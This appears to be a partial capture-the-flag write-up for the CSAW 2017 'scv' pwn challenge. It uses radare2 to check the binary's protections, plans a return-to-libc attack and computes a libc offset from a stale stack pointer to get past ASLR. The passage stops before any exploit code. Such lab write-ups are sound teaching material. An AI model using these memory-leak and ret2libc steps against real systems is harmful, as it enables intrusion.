
Pwn 100p "scv" using radare2
============================

SCV is too hungry to mine the minerals. Can you give him some food?

`nc pwn.chal.csaw.io 3764`

----

```bash
$ file ./scv
ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked
```

```bash
$ r2 ./scv -c info
canary   true
nx       true 
pic      false
relro    partial
relocs   false
stripped true
...
```

Hence, most likeyly we cannot use the stack to execute arbitrary code.
Most likely this is a ret2libc (return-to-libc) attack.

Using `pxr @rsp` at bp 0x00400b0a it is notable

```python
[0x00400b0a]> pxr @rsp
0x7fff48aab750  0x0000000100000000   ........ @rsp
0x7fff48aab758  0x0000000400000001   ........
0x7fff48aab760  0x0000000041414141   AAAA.... @rsi ascii
0x7fff48aab768  0x00000000006022f9   ."`..... (LOAD1) (/root/ctf/csaw17/scv/scv) program R W 0x0 --> r14
0x7fff48aab770  0x0000000000400930   0.@..... (LOAD0) (/root/ctf/csaw17/scv/scv) sub._ZNSt8ios_base4InitD1Ev_72_930 sub._ZNSt8ios_base4InitD1Ev_72_930 program R X 'jmp qword [rip + 0x201712]' 'scv'
0x7fff48aab778  0x0000000000400930   0.@..... (LOAD0) (/root/ctf/csaw17/scv/scv) sub._ZNSt8ios_base4InitD1Ev_72_930 sub._ZNSt8ios_base4InitD1Ev_72_930 program R X 'jmp qword [rip + 0x201712]' 'scv'
0x7fff48aab780  0x0000000000602080   . `..... (LOAD1) (/root/ctf/csaw17/scv/scv) program R W 0x0 --> r14
0x7fff48aab788  0x00007f65b306c299   ....e... (/root/ctf/csaw17/scv/libc-2.23.so) library R X 'test rax, rax' 'libc-2.23.so'
...
```

Look at the last line. That is a junk on the stack pointing in to libc. Great!

Find where libc is dynamically loaded using `dmi`:
[0x00400b0a]> dmi
0x00400000 /root/ctf/csaw17/scv/scv
0x7f65b3032000 /root/ctf/csaw17/scv/libc-2.23.so
...

Lets find out the offset to the junk found on the stack: 0x7f65b306c299 - 0x7f65b3032000 = 0x3a299.
Perfect! Now we have a reference to map._root_ctf_csaw17_scv_libc_2.23.so.






